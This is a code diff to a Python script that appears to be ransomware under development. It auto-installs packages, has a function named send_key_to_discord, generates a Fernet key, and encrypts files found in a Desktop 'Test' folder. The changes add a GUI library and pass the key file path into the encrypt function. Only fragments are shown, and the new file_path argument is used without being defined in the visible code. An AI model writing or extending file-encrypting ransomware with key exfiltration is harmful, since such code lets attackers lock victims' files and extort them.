@@ -4,7 +4,7 @@ import subprocess
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-required_packages = ["subprocess", "sys", "argparse","os", "pathlib", "cryptography", "requests", "platform", "socket", "datetime"]
+required_packages = ["subprocess", "sys", "argparse","os", "pathlib", "cryptography", "requests", "platform", "socket", "datetime", "customtkinter"]
 for package in required_packages:
     print(f"Checking for {package}")
     try:
@@ -264,8 +264,9 @@ def send_key_to_discord():
     #     files['file'][1].close()  # Close the file after sending
 
 
-def encrypt(target):
-    with open(f"{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
+def encrypt(target, file_path):
+    # with open(f"{pathlib.Path(sys.argv[0]).parent.absolute()}/symmetric_key.key", "rb") as keyfile:
+    with open(file_path, "rb") as keyfile:
         key = keyfile.read()
     key = Fernet(key)
     
@@ -318,4 +319,5 @@ def start_point():
         generateKey()
         directory = navigateToDir("Desktop"+ path_str +"Test")
         target = getFiles(directory)
-        encrypt(target)
+        encrypt(target, file_path)
+
